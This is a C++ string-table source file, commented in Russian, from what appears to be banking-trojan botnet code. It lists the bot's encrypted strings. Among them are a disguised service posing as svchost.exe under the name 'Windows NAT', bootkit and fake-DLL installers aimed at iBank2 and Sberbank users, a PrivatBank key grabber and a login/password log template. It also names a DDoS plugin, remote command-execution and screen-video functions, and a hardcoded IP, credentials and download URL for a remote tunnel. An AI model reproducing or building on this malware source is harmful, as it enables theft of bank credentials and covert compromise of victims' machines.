//---------------------------------------------------------------------------

#pragma hdrstop

#include "StrConsts.h"
#include "Config.h"
#include "Crypt.h"
#include "Crypt.h"

#include "Modules.h"

//---------------------------------------------------------------------------


extern CSSTR BeginCryptBlock[];
extern CSSTR EndCryptBlock[];



//*****************************************************
// GetStr - Функция расшифровывает строку EncryptedStr
//*****************************************************
string GetStr(const char* EncryptedStr)
{
	string Result = EncryptedStr;

	bool Encrypted = !Result.IsEmpty() && EncryptedStr > BeginCryptBlock &&
					 EncryptedStr < EndCryptBlock && EncryptedStr[0] != 'C' &&
					 BeginCryptBlock[0] != 'C';

	if (Encrypted)
	{
		// Расшифровываем строку
		XORCrypt::Crypt(GetSessionPassword(), (LPBYTE)Result.t_str(), Result.Length());
	}

	return Result;
}
//-----------------------------------------------------------------------------



//==================================================//
CSSTR BeginCryptBlock[] = ENCRYPTED_STRINGS_BEGIN;  //
//=============================================================================
//  Блок хранения шифрованных строк.
//  Все строки находящиеся ниже и до определения
//  CSEND
//  будут шифроваться билдером
//=============================================================================


CSSTR StrBotGlobalMutexName[] = "GSA28593KFE7"; // Префикс глобального мьютекса сигнализирующего, что бот запущен
CSSTR StrBootkitIsRunMutex[] = "BIR737JK3LJ"; //мьютекс сигнализирующий, что запущен бот из под буткита


// Оригинальное имя ехе файла бота
CSSTR EStrOriginalBotExeName[] = "WtJoeBt.exe";
CSSTR EStrBotStartupLinkName[] = "wslneo.lnk";  // Имя ярлыка в автозагрузке

// Поддирректория сервиса
CSSTR EStrBotServiceExePath[] = "com\\";

// Имя ехе файла сервиса бота
CSSTR EStrBotServiceExeName[] = "svchost.exe";


// Имя сервиса
CSSTR EStrServiceName[] = "Windows NAT";


// Рабочии директории и файлы
CSSTR StrBotWorkPath[] = "WnsBMT"; // Рабочий каталог бота
CSSTR StrGrabberPath[] = "gdata";  // Имя рабочей папки грабера

CSSTR EStrConfigFileName[]   = "igfxtray.dat"; // Имя файла хранения конфига
CSSTR EStrConfigHPFileName[] = "igfxtrayhp.dat"; // Имя файла хранения конфига повышенного приоритета


// Имена служебный пайпов
CSSTR EStrPipeLoader[] = "ldrspp"; // Имя служебного пайпа лоадера



// Служебные команды, передаваемые через пайпы процессам
CSSTR EStrProcessCommandDeleteBot[] = "delbt";  // Команда на удаление exe бота

// Имена служебных фалов
CSSTR EStrPrefixFileName[] = "mnprsdd.dat"; // Файл хранения префикса
CSSTR EStrTemporaryPrefixFileName[] = "mnprsdd.tmp"; // Временный Файл хранения префикса


// Имя плагина бота в виде длл
CSSTR EStrBotPlug[] = "bot.plug";

// Имф инсталтора буткита
CSSTR EStrBootkitInstaller[] = "bki.plug";


//Имя систем граберов
CSSTR EStrSystemPrivat[] = "privat"; // Грабер ключей приватбанка


// Имя инсталятора фэкедлл
CSSTR EStrFakeDllInstaller[] = "fdi.plug";
// Имя файла по которому определяем, что установлена фейкдлл (файл в папке бота)
CSSTR EStrFakeDllFlag[] = "fdi.txt";


// Перечень команд, которые может выполняь бот
CSSTR EStrCommandInstallFakeDLL[] = "installfd";  // Команда на инсталяцию фэкедлл
CSSTR EStrCommandInstallBootkit[] = "installbk";  // Команда на инсталяцию буткита


// Имена файлов, для добавления в лог
CSSTR StrLogFileScreenShot[]  = "Screen.png";
CSSTR StrLogFileInformation[] = "Info.txt";
CSSTR StrLogFileNetInfo[]     = "NetInfo.txt";


// Имена функций библиотеки видеозаписи.
CSSTR VideoRecFuncInit[]			= "Init";
CSSTR VideoRecFuncRelease[]			= "Release";
CSSTR VideoRecFuncAddIPServer[]		= "AddIPServer";
CSSTR VideoRecFuncRecordProcess[]	= "StartRecPid";
CSSTR VideoRecFuncRecordWnd[]		= "StartRecHwnd";
CSSTR VideoRecFuncStop[]			= "StopRec";
CSSTR VideoRecFuncResetTimer[]		= "ResetTimer";
CSSTR VideoRecFuncSendFiles[]		= "StartSend";
CSSTR VideoRecFuncSendFilesAsync[]	= "StartSendAsync";
CSSTR VideoRecFuncIsSendedAsync[]	= "IsSendedAsync";
CSSTR VideoRecFuncRunCmdExec[]		= "RunCmdExec";
CSSTR VideoRecFuncSendLog[]			= "SendLog";
CSSTR VideoRecPipe[]				= "VideoServer";


CSSTR HTTPFormContentDisposition[] = "Content-Disposition: form-data; ";
CSSTR HTTPFormFieldName[]          = "name=\"%s\"";
CSSTR HTTPFormFileInfo[]           = "; filename=\"%s\"\r\nContent-Type: %s\r\nContent-Transfer-Encoding: binary";
CSSTR HTTPOctetStream[]            = "application/octet-stream";


CSSTR IFobsFlagCopy[] = "ifobscopy.txt";


// Строки модуля AzConfig
#ifdef AzConfigH
	CSSTR AzConfigParamUserName[] = "%az_user%";
#endif


// Строки модуля BSS грабера
#ifdef BSSH
	CSSTR BSSLogTemplate[] = "Url: %s\r\n\r\n"
							 "Login:     %s\r\n"
							 "Password:  %s\r\n\r\n"
							 "UserAgent: %s\r\n";
#endif



#ifdef FakeDllInstallerH
	CSSTR EStrIBankRegistryPath[] = "SOFTWARE\\Classes\\Installer\\Products\\7B00DF09E169B5445AD2F176D624114\\";
	CSSTR EStrSberRegistryKey[]   = "SBRF\\";
	CSSTR EStrIBankFileName[]     = ".iBank2"; // Имя файли при обнаружении которого будет установлена Fake DLL
#endif


#ifdef ddosH
	// Имя плагина DDOS
	CSSTR EStrDDOSPlugin[] = "ddos.plug";

	// Имя файла данных для команды DDOS
	CSSTR EStrDDOSSignal[] = "ddos.sig";
#endif


CSSTR RDPRunParam[] = "88.198.53.14;22;445;sshu;P@ssw0rd;system_help;fixerESCONuendoZ;http://www.cushyhost.com/download.php?img=73";

//=============================================================================
// Конец блока шифрованных строк
//=============================================================================
CSSTR EndCryptBlock[] = ENCRYPTED_STRINGS_END; //
//=============================================//





//-----------------------------------------------------------------------------
// Не шифрованные строки
//-----------------------------------------------------------------------------

CSSTR Slash[]   = "\\";
CSSTR SlashChar = '\\';
